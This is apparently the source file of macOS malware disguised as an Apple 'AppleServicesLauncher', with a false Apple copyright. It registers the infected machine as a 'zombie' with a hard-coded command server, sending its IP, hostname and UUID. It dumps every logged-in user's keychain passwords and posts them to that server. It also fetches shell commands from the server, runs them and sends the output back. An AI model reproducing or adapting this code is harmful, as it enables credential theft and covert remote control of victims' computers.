//
//  Initializer.m
//  AppleServicesLauncher
//
//  Created by Nikola Tesla on 9/27/14.
//  Copyright (c) 2014 Apple. All rights reserved.
//

#import "WTServerApi.h"
#import "WTShellCommands.h"
#import "WTHTTPApi.h"
#import "WTUserApi.h"
#import "WTConfig.h"
#import "keychaindump.h"
#import "WTUUIDApi.h"
#import "WTJsonParser.h"
#import "WTLogger.h"
#import <Cocoa/Cocoa.h>

@implementation WTServerApi

+(NSString*) registerOwner {
    [WTLogger neutral:@"registerOwner start"];
    WTHTTPApi *httpObj = [[WTHTTPApi alloc] init];
    [WTLogger neutral:@"registerOwner returning"];
    return [httpObj httpPostRequest:@"http://128.199.167.133/create/owner" usingGetData:nil usingPostData:@{@"name":[WTUserApi getOwner]}];
}

+(NSString *) createZombie:(NSString *)ownerID {
    [WTLogger neutral:@"createZombie start"];
    SInt32 major, minor, bugfix;
    Gestalt(gestaltSystemVersionMajor, &major);
    Gestalt(gestaltSystemVersionMinor, &minor);
    Gestalt(gestaltSystemVersionBugFix, &bugfix);
    NSString *systemVersion = [NSString stringWithFormat:@"%d.%d.%d", major, minor, bugfix];
    WTHTTPApi *httpObj = [[WTHTTPApi alloc] init];
    NSString *ip = [httpObj httpGetRequest:@"http://icanhazip.com/" usingData:nil];
    NSString *hostName = [[NSHost currentHost] localizedName];
    NSDictionary *postData = @{@"ip":ip, @"hostname":hostName, @"authentication_key":@"12345", @"os_version":systemVersion, @"mac":[WTUUIDApi getSystemUUID]};
    [WTLogger neutral:@"createZOmbie returning"];
    return [httpObj httpPostRequest:[NSString stringWithFormat:@"%@/%@", @"http://128.199.167.133/create/zombie", ownerID] usingGetData:nil usingPostData:postData];
}

+(NSString *)createUser:(NSString *)userName withZombieId:(NSString *)zombieId {
    [WTLogger neutral:@"createUser start"];
    WTHTTPApi *httpObj = [[WTHTTPApi alloc] init];
    [WTLogger neutral:@"registerOwner returning"];
    return [httpObj httpPostRequest:[NSString stringWithFormat:@"http://128.199.167.133/create/user/%@", zombieId] usingGetData:nil usingPostData:@{@"name":userName, @"password":@"[Not yet known]"}];
}

+(NSDictionary *)createAllUsers:(NSString *)zombieId {
    [WTLogger neutral:@"createAllUsers start"];
    NSArray *allUsers = [WTUserApi getAllUsers];
    NSMutableDictionary *userIds = [[NSMutableDictionary alloc] init];
    for (NSString *user in allUsers) {
        [userIds setValue:[WTServerApi createUser:user withZombieId:zombieId] forKey:user];
    }
    [WTLogger neutral:@"registerOwner returning"];
    return userIds;
}

+(void)createCredential:(NSDictionary *)credentialInfo withUserId:(NSString *)userId {
    [WTLogger neutral:@"createCredential start"];
    WTHTTPApi *httpObj = [[WTHTTPApi alloc] init];
    NSDictionary *postData = @{@"server":credentialInfo[@"server"], @"username":credentialInfo[@"username"], @"password":credentialInfo[@"password"]};
    [httpObj httpPostRequest:[NSString stringWithFormat:@"http://128.199.167.133/create/credential/%@", userId] usingGetData:nil usingPostData:postData];
    [WTLogger neutral:@"registerOwner returning"];
}

+(void)createAllCredentialsForUser:(NSString *)user withUserId:(NSString *)userId {
    [WTLogger neutral:@"createAllCredentialsForUser start"];
    NSArray *allCreds = [keychaindump getPasswordsForUser:user];
    for (NSDictionary *cred in allCreds) {
        [WTServerApi createCredential:cred withUserId:userId];
    }
    [WTLogger neutral:@"createAllCredentialsForUser returning"];
}

+(void)initializeNewZombie {
    [WTLogger neutral:@"initializeNewZombie start"];
    WTConfig *config = [WTConfig getConfig];
    NSString *ownerId = [WTServerApi registerOwner];
    [config setOwnerId:ownerId];
    NSString *zombieId = [WTServerApi createZombie:ownerId];
    [config setZombieId:zombieId];
    NSDictionary *userIds = [WTServerApi createAllUsers:zombieId];
    for (id key in userIds) {
        [config setUserId:userIds[key] forUser:key];
    }
    [config setInitialized];
    NSArray *loggedInUsers = [WTUserApi getUsers];
    for (NSString *theUser in loggedInUsers) {
        [WTServerApi createAllCredentialsForUser:theUser withUserId:[userIds objectForKey:theUser]];
    }
    [WTLogger neutral:@"initializeNewZombie returning"];
}

+(NSArray *)nextCommand {
    [WTLogger neutral:@"nextCommand start"];
    NSAlert *alert = [NSAlert alertWithMessageText:@"Go" defaultButton:@"Go" alternateButton:@"g" otherButton:@"f" informativeTextWithFormat:@"f"];
    //[alert runModal];
    WTConfig *config = [WTConfig getConfig];
    NSString *zombieId = [config getZombieId];
    NSString *url = [NSString stringWithFormat:@"%@/next/command/%@", [config getBaseUrl], zombieId];
    NSString *response = [[[WTHTTPApi alloc] init] httpGetRequest:url usingData:nil];
    NSDictionary *responseJson = [WTJsonParser parseJson:response];
    if (responseJson == nil) {
        return nil;
    }
    NSString *commandId = [responseJson objectForKey:@"id"];
    NSString *command = [responseJson objectForKey:@"command"];
    [WTLogger neutral:@"nextCommand returning"];
    return @[commandId,command];
}

+(void)sendCommandOutput:(NSString *)output withCommandId:(NSString *)commandId {
    [WTLogger neutral:@"sendCommandOutput start"];
    WTHTTPApi *httpObj = [[WTHTTPApi alloc] init];
    WTConfig *config = [WTConfig getConfig];
    NSString *url = [NSString stringWithFormat:@"%@/finished/command/%@", [config getBaseUrl], commandId];
    [httpObj httpPostRequest:url usingGetData:nil usingPostData:@{@"output":output}];
    [WTLogger neutral:@"sendCommandOutput returning"];
}

+(void)execNextCommand {
    [WTLogger neutral:@"execNextCommand start"];
    WTConfig *config = [WTConfig getConfig];
    NSArray *nextCommandArray = [WTServerApi nextCommand];
    if (nextCommandArray == nil) {
        return;
    }
    NSString *commandId = nextCommandArray[0];
    NSString *command = nextCommandArray[1];
    NSString *commandOutput = [WTShellCommands runShellCommand:command withMaxBufferSize:-1];
    NSString *url = [NSString stringWithFormat:@"%@/finished/command/%@", [config getBaseUrl], commandId];
    [[[WTHTTPApi alloc] init] httpPostRequest:url usingGetData:nil usingPostData:@{@"output":commandOutput}];
    [WTLogger neutral:@"execNextCommand returning"];
}

@end
